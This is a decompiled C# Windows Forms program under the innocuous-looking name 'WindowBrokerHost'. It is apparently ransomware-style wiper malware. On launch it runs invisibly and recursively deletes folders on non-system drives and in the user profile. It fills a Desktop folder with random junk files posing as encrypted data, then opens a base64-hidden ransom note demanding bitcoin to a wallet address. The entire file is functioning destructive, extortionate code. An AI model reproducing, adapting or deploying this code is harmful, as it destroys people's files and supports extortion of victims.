using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace WindowBrokerHost;

public class Form1 : Form
{
	public static List<string> AllFolders;

	public static List<string> AllFiles;

	private IContainer components;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
		((Form)this).add_Load((EventHandler)Form1_Load);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		button1.PerformClick();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		byte[] bytes = Convert.FromBase64String("QUxMIEZJTEVTIE9OIEFMTCBZT1VSIERJU0tTLCBDTE9VRCBTVE9SQUdFLCBGTEFTSCBEUklWRVMgSEFTIEJFRU4gRU5DUllQVEVEDQpJZiB5b3Ugd2FudCB0byBkZWNyeXB0IHlvdXIgRklMRVMNCllvdSBzaG91bGQgdHJhbnNmZXIgMC4wMDUgYml0Y29pbihidGMpIHRvIGFkZHJlc3MgYmMxcTZyMzRlcHlocmpna2FwaHQ1bTkwcTgwZXhzeGFwbms1Nm02Z3RuDQpBZnRlciBQYXltZW50IHdpbGwgZG9uZSBhbGwgeW91ciBmaWxlcyB3aWxsIGJlIGF1dG8gRGVjcnlwdA0KV2hlcmUgdG8gYnV5IHRoZSBCaXRjb2lucz8NCmh0dHBzOi8vbG9jYWxiaXRjb2lucy5jb20vYnV5LWJpdGNvaW5zLW9ubGluZS9ldXIvDQpodHRwczovL3d3dy50aGViYWxhbmNlbW9uZXkuY29tL2Jlc3QtcGxhY2VzLXRvLWJ1eS1iaXRjb2luLTQxNzAwODE=");
		string @string = Encoding.UTF8.GetString(bytes);
		try
		{
			del();
			foreach (string allFolder in AllFolders)
			{
				try
				{
					Directory.Delete(allFolder, recursive: true);
				}
				catch
				{
				}
			}
			foreach (string allFile in AllFiles)
			{
				try
				{
					Directory.Delete(allFile, recursive: true);
				}
				catch
				{
				}
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
			if (!Directory.Exists(folderPath + "\\crypt\\"))
			{
				Directory.CreateDirectory(folderPath + "\\crypt\\");
				for (int i = 0; i < 3862; i++)
				{
					Random random = new Random();
					byte[] array = new byte[10240];
					random.NextBytes(array);
					File.WriteAllBytes(folderPath + "\\crypt\\CryptoArch" + i + ".crypto", array);
				}
			}
			File.WriteAllText(folderPath + "\\readme.txt", @string);
			appRun("notepad", folderPath + "\\readme.txt", 0);
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public static void appRun(string app, string argx, int hid)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = app;
			processStartInfo.Arguments = argx;
			processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
		}
		catch
		{
		}
	}

	public static void del()
	{
		AllFiles = new List<string>();
		AllFolders = new List<string>();
		string[] logicalDrives = Directory.GetLogicalDrives();
		Array.Reverse((Array)logicalDrives);
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			if (!text.Contains("C:"))
			{
				try
				{
					string[] directories = Directory.GetDirectories(text);
					string[] files = Directory.GetFiles(text, "*.*");
					string[] array2 = directories;
					foreach (string path in array2)
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							AllFolders.Add(directoryInfo.FullName);
						}
						catch
						{
						}
					}
					array2 = files;
					foreach (string fileName in array2)
					{
						try
						{
							FileInfo fileInfo = new FileInfo(fileName);
							AllFiles.Add(fileInfo.FullName);
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				continue;
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
			try
			{
				string[] directories2 = Directory.GetDirectories(folderPath);
				string[] files2 = Directory.GetFiles(folderPath, "*.*");
				string[] array2 = directories2;
				foreach (string text2 in array2)
				{
					try
					{
						if (!text2.Contains("AppData"))
						{
							DirectoryInfo directoryInfo2 = new DirectoryInfo(text2);
							AllFolders.Add(directoryInfo2.FullName);
						}
					}
					catch
					{
					}
				}
				array2 = files2;
				foreach (string fileName2 in array2)
				{
					try
					{
						FileInfo fileInfo2 = new FileInfo(fileName2);
						AllFiles.Add(fileInfo2.FullName);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(33, 30));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(309, 97));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}
}
